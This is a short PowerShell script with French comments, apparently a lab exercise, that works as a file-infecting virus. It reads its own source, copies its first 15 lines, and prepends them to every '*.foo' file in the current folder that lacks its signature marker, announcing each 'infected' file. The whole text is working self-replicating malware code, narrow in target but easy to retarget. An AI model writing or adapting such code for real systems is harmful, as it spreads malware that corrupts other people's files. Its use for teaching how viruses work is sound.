# Marqueur de signature
$MARQUEUR = "# --- CODE_VIRAL_TP0_3 ---"

# Lecture de soi-même
$monScript = $MyInvocation.MyCommand.Path
$lignesVirus = Get-Content $monScript

# Extraction de la charge (les 15 premières lignes de ce script)
$payload = $lignesVirus[0..14]

# Ciblage
$cibles = Get-ChildItem -Filter "*.foo"

foreach ($fichier in $cibles) {
    $contenuOriginal = Get-Content $fichier.FullName -Raw

    # Vérification
    if ($contenuOriginal -match $MARQUEUR) {
        continue
    }

    # Infection (Payload + Original)
    $nouveauContenu = ($payload -join "`n") + "`n`n" + $contenuOriginal
    Set-Content -Path $fichier.FullName -Value $nouveauContenu -Encoding UTF8
    
    Write-Host "Fichier infecté : $($fichier.Name)"
}
